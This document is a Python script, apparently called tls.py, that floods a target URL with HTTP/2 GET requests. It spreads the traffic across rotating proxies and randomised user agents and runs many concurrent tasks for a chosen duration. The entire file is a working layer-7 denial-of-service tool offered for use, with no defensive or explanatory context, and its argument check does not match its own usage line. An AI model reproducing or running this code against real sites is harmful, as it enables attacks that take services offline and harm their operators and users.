import asyncio
import httpx
import random
import sys
import time
import ssl
import os

def read_proxies(proxy_file):
    with open(proxy_file, 'r') as f:
        return [line.strip() for line in f.readlines()]

def random_user_agent():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0"
    ]
    return random.choice(user_agents)

async def attack(target, proxies, rate, duration):
    end_time = time.time() + duration
    headers = {
        ":method": "GET",
        ":path": "/",
        ":scheme": "https",
        "accept": "/",
        "accept-language": "en-US,en;q=0.9",
        "accept-encoding": "gzip, deflate",
        "cache-control": "no-cache",
        "upgrade-insecure-requests": "1",
    }

    while time.time() < end_time:
        proxy = random.choice(proxies).split(":")
        proxy_url = f"http://{proxy[0]}:{proxy[1]}"
        user_agent = random_user_agent()
        headers["user-agent"] = user_agent

        async with httpx.AsyncClient(proxies={"http": proxy_url, "https": proxy_url}, http2=True) as client:
            try:
                for _ in range(rate):
                    await client.get(target, headers=headers)
            except Exception as e:
                pass

def main():
    if len(sys.argv) < 7:
        print("Usage: python tls.py <url> <time> <req> <thread> proxy.txt")
        sys.exit()

    target = sys.argv[1]
    duration = int(sys.argv[2])
    rate = int(sys.argv[3])
    threads = int(sys.argv[4])
    proxy_file = sys.argv[5]

    proxies = read_proxies(proxy_file)

    tasks = [asyncio.ensure_future(attack(target, proxies, rate, duration)) for _ in range(threads)]
    asyncio.get_event_loop().run_until_complete(asyncio.wait(tasks))

if __name__ == "__main__":
    main()
